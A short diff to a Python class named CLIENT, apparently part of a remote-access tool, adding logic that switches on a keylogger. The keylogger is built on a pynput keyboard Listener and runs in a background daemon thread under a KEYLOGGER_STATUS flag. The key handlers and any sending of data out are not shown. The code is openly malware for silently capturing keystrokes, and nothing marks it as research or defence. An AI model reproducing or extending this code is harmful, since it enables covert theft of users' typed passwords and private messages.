@@ -34,3 +34,12 @@ class CLIENT:
         def logger():
             with Listener(on_press=on_press, on_release=on_release) as listener:
                 listener.join()
+            
+        if status:
+            if not self.KEYLOGGER_STATUS:
+                self.KEYLOGGER_STATUS = True
+                t = threading.Thread(target=logger)
+                t.daemon = True
+                t.start()
+        else:
+            self.KEYLOGGER_STATUS = False
